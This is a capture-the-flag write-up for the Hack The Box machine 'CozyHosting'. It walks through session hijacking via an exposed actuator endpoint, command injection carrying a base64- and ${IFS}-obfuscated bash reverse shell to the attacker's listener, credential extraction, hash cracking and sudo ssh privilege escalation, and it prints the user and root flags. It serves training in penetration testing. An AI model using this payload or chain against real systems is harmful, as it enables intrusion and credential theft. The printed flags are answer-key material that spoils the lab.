![CozyHosting](https://github.com/Kae-Desu/hackthebox/assets/87841341/de54da9e-905e-4465-8970-e30a68cc9882)

check if the machine is online with `curl 10.10.11.230 -I` it also possible to retrieve the `Location` header

![Pasted image 20231004113616](https://github.com/Kae-Desu/hackthebox/assets/87841341/fcaacac8-81af-475d-b446-a5cb01f19493)

got a `Location` header, lets add it into `/etc/hosts`, then start to map the services running in the server using `nmap -sVC -Pn -oN nmap cozyhosting.htb`
note: for some reason the machine seems to drop off nmap ping that's why i'm passing the -Pn flag

![Pasted image 20231004123011](https://github.com/Kae-Desu/hackthebox/assets/87841341/547cf062-cad6-491f-bcf5-9d35c3493135)

based on the scan results it seems like port 80(http) and 22(ssh) are open, lets visit the sites.

![Pasted image 20231004123119](https://github.com/Kae-Desu/hackthebox/assets/87841341/e3ecca74-b58d-420a-830f-c901fe8f41fa)

a simple webpages with something to interact with, after some click here and there, the interesting page is only on the `/login` pages

![Pasted image 20231004123228](https://github.com/Kae-Desu/hackthebox/assets/87841341/618146cc-1912-478b-adaf-a3cc925e59c4)

its a normal login pages, no service or software version known, lets try to input some test credentials such as `admin:admin`, nothing changed but the url shows that an `error login attempt` checking the cookies shows an interesting finding

![Pasted image 20231004123631](https://github.com/Kae-Desu/hackthebox/assets/87841341/629a2f81-c011-436b-93e7-f09fa87b5be4)

there's a `JSESSIONID` cookies set, looks like i should steal some cookies. but from where? lets try to brute some directory using `dirsearch` (this is not installed along with kali installation). github link: https://github.com/maurosoria/dirsearch
there's some reason why i use this tools, one of them is it come with it's own wordlists which some of its content not inside SecLists or kali wordlists directory (or i just cant find them), anyway run the dirsearch with this command
`dirsearch -u cozyhosting.htb --format plain -o dirsearch`

![Pasted image 20231004214259](https://github.com/Kae-Desu/hackthebox/assets/87841341/d88c87b1-05c1-4fad-b670-8eb19950e4d9)

let dirsearch do its thing, and after a while its finish and i notice some interesting directory

![Pasted image 20231004214351](https://github.com/Kae-Desu/hackthebox/assets/87841341/b3a23bca-4854-4f6c-86a9-a2e321161e8e)

there's a bunch of `/actuator` directory, but most of them return 0B lets find something that's not 0B

![Pasted image 20231004214504](https://github.com/Kae-Desu/hackthebox/assets/87841341/b8f8286b-f015-48e7-aada-4287564666bb)

found it, there are few but since we're dealing with cookie sessions, lets open up the `/actuator/sessions` in the web

![Pasted image 20231004215135](https://github.com/Kae-Desu/hackthebox/assets/87841341/60b6ace2-4665-46cc-9900-974b23752120)

it store a cookie sessions for a person named `kanderson`, lets copy the cookie value and paste it on the `JSESSIONID` field

![Pasted image 20231004215315](https://github.com/Kae-Desu/hackthebox/assets/87841341/e62dc647-6368-4982-a016-3fe8c1bc67ed)

and pass the login credentials, i could use anything as long as the username is `kanderson` im using `kanderson:anything` here

![Pasted image 20231004215729](https://github.com/Kae-Desu/hackthebox/assets/87841341/21f5ccca-558d-46fc-8f3d-9cb0fa9ea054)

and i have succesfully logged in

![Pasted image 20231004215747](https://github.com/Kae-Desu/hackthebox/assets/87841341/b605a787-c636-41ab-b6bb-ca7dbd22ac0c)

after some scrolling and clicking it seems like the only interactable thing are this `host automatic hosting` thing

![Pasted image 20231004220202](https://github.com/Kae-Desu/hackthebox/assets/87841341/d46c7f56-9174-4756-b38f-5dbe0f9ea189)

lets try to make some request with known username and hosts

![Pasted image 20231004220310](https://github.com/Kae-Desu/hackthebox/assets/87841341/1dd94aba-4331-47be-9930-b332f08d758b)

![Pasted image 20231004222501](https://github.com/Kae-Desu/hackthebox/assets/87841341/6bb93a1f-b7fa-4337-8272-2c3db6ae0b73)

it seems to say error about `Host Key Verification`, this should refer to the above `.ssh/authorised_keys` file, lets see how this works in the packet level using `burpsuite` to capture the requests

![Pasted image 20231004222845](https://github.com/Kae-Desu/hackthebox/assets/87841341/6d4f874f-67fb-49be-9ea9-5818c09c5561)

its making a POST request to `/executessh`, and it seems like to be vulnerable to `command injection` vulnerability

after some trial and error, and a long journey of google search, i found this github repo: https://github.com/six2dez/pentest-book/blob/master/exploitation/reverse-shells.md, especially this part

![Pasted image 20231006014015](https://github.com/Kae-Desu/hackthebox/assets/87841341/5869b2b2-df70-419f-9741-7d49a6e1b95d)

`bash reverse shell` without whitespace because the backend don't accept whitespaces, but before i craft the payload, make sure to setup `nc listener` using `nc -lnvp 9999`

![Pasted image 20231006015135](https://github.com/Kae-Desu/hackthebox/assets/87841341/2af97450-f148-451f-b489-5bb39b5da333)

after the listener been set up, next is to borrow the payload format, preparing the command to be obfuscated in base64. the payload are borrowed from here https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
`bash -i >& /dev/tcp/insert.your.ip.here/port 0>&1` and convert it into base64 using this command `echo "PAYLOAD" | base64 -w0` -w0: disable line wrapping \
in my case it return `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85OTk5IDA+JjEK`.

nest step is to craft the request payload, the format are
`;echo${IFS}COMMAND_BASE64${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;` change all whitspace with `${IFS}` and add `;` in the start and end of line

will result in this payload
`;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85OTk5IDA+JjEK"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;`

to ensure smaller margin of error to appear, lets encode this payload into a url encoded format via https://www.urlencoder.org/
and resulting in the final payload \
`%3Becho%24%7BIFS%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMy85OTk5IDA%2BJjEK%22%24%7BIFS%7D%7C%24%7BIFS%7Dbase64%24%7BIFS%7D-d%24%7BIFS%7D%7C%24%7BIFS%7Dbash%3B`

send the payload via the username field in the burpsuite request

![Pasted image 20231006015229](https://github.com/Kae-Desu/hackthebox/assets/87841341/1b9dd956-0903-4698-a0f1-df6cf53560f2)

note: the cookie will much likely to be expire, so try to visit `/actuator/sessions`, get another session and changed the one in line 12
after all are sets, send the payload and check the listener that have been set up

![Pasted image 20231006015341](https://github.com/Kae-Desu/hackthebox/assets/87841341/d239e889-42cc-42e3-8735-2a560c603aa9)

![Pasted image 20231006015353](https://github.com/Kae-Desu/hackthebox/assets/87841341/ad606d62-26e2-4f09-ac5b-2ad604ecbdcf)

got a reverse connection from the server, looks like its logged in as user named 'app' by default, lets check for something interesting in this user

![Pasted image 20231006015741](https://github.com/Kae-Desu/hackthebox/assets/87841341/6392949c-8298-436f-8b51-c97432a6e5f1)

there seems to be a java file there, could be worth decompile it, lets download it for further inspection. first start a python http server in the server

![Pasted image 20231006015941](https://github.com/Kae-Desu/hackthebox/assets/87841341/91d0fc1b-7457-47d6-a5a1-d39788e6ce86)

without the port specified, python will create a server at port 8000, but in my case someone or something use the port 8000 so i have to specify another port which it 7878\
after that, download the file from the server with `wget http://cozyhosting.htb:7878/filename`

![Pasted image 20231006020119](https://github.com/Kae-Desu/hackthebox/assets/87841341/b1d96e19-ac4d-48d1-adb4-fc7d6ed20ec9)

after the file been downloaded, open it in a java decompiler `jd-gui`, its not installed in kali, so makesure to install it, and open it with `jd-gui filename`

![Pasted image 20231006020306](https://github.com/Kae-Desu/hackthebox/assets/87841341/bef53d8e-7a51-4e84-b0f2-3e06fb615716)

after opening it, lets find something interesting such as `BOOT-INF` looks like this will be read everytime it is booted

![Pasted image 20231006020412](https://github.com/Kae-Desu/hackthebox/assets/87841341/b5b383cc-0d8d-49f0-87b4-80b3eeecbcaa)

as expected, theres credentials and something worth looking here such as, a password, the postgres username, the table name and location. and it looks like its running postgres, lets try to connect to the database

![Pasted image 20231006020639](https://github.com/Kae-Desu/hackthebox/assets/87841341/a27ee5b6-6347-4947-bfc1-e8cd882363d1)

![Pasted image 20231006020743](https://github.com/Kae-Desu/hackthebox/assets/87841341/f57be438-5030-4b61-ad12-aa8fbad105dc)

![Pasted image 20231006020814](https://github.com/Kae-Desu/hackthebox/assets/87841341/b3102447-65a9-4c1c-8279-b0ce70efb43e)

an interesting table named `users` lets dump the content

![Pasted image 20231006020917](https://github.com/Kae-Desu/hackthebox/assets/87841341/588143e6-99ae-4643-bb27-47a927a075fa)

the password is hashed. lets try to crack it, first move the hash into some file and then run `hashid`, since admin is logically have a higher privilege lets crack this one

![Pasted image 20231006021331](https://github.com/Kae-Desu/hackthebox/assets/87841341/757e3fb9-5228-4844-87a2-c76747a2325d)

the hash type are as above, find the hash mode for `hashcat` with https://gist.github.com/dwallraff/6a50b5d2649afeb1803757560c176401 which is 3200. since i will use this tools, its mandatory to use this step except if the hash are pretty easy to be identified such as SHA-1, SHA-128, etc \
note: im switching to mac for this password cracking since the kali run on VM and are slow, the command are the same `hashcat -a 0 -m 3200 credsfile /path/to/wordlists.txt` im using rockyou.txt

![Pasted image 20231006021656](https://github.com/Kae-Desu/hackthebox/assets/87841341/5ff1856b-4668-4fa6-9c82-6b161718c736)

the password is `manchesterunited`. this password is for the admin, which is not kanderson. so i need to find something other user in this server which could be achieved by listing the `/home` directory

![Pasted image 20231006021850](https://github.com/Kae-Desu/hackthebox/assets/87841341/f427f256-2c68-4810-8d3b-4d638431aed0)

there's another user named `josh` lets try SSH with the known credentials `josh:manchesterunited`

![Pasted image 20231006021934](https://github.com/Kae-Desu/hackthebox/assets/87841341/2025de75-ce55-4660-983e-5bd03cead044)

enter the password, and i'm logged in as josh\
user acquired

![Pasted image 20231006012706](https://github.com/Kae-Desu/hackthebox/assets/87841341/e18f6184-3dfc-4567-9539-e944392a2f15)

<details>
  <summary>User Flag</summary>
  b00bb601489cde33d3d2c7ae03ccf2a0
</details>

<h1>Priv Esc</h1>

to do the privesc first i need to know if this user are allowed to run something with the sudo command, and to check it is by using `sudo -l`

![Pasted image 20231006022152](https://github.com/Kae-Desu/hackthebox/assets/87841341/c6618381-1d3e-4d3c-9c9c-6e12f1d2f456)

this user seems to be allowed to run SSH as sudo, lets check GTFOBin for some way to gain privesc https://gtfobins.github.io/gtfobins/ssh/

![Pasted image 20231006022245](https://github.com/Kae-Desu/hackthebox/assets/87841341/1254e5f9-97de-47a0-ab6f-4df87851fff2)

found a potential payload, lets borrow that payload

![Pasted image 20231006022321](https://github.com/Kae-Desu/hackthebox/assets/87841341/b8457b70-7dec-4fb7-8c4d-89f744d2a91a)

root acquired

![Pasted image 20231006022343](https://github.com/Kae-Desu/hackthebox/assets/87841341/cb93f49d-d447-4760-958f-3f4b0ab9a6b7)

<details>
  <summary>Root Flag</summary>
  f20fac57e6d73128750fe0ee3b91f336
</details>

![Pasted image 20231006013038](https://github.com/Kae-Desu/hackthebox/assets/87841341/3b4f4f35-6a30-4a93-bebd-5e3e69fc5a77)
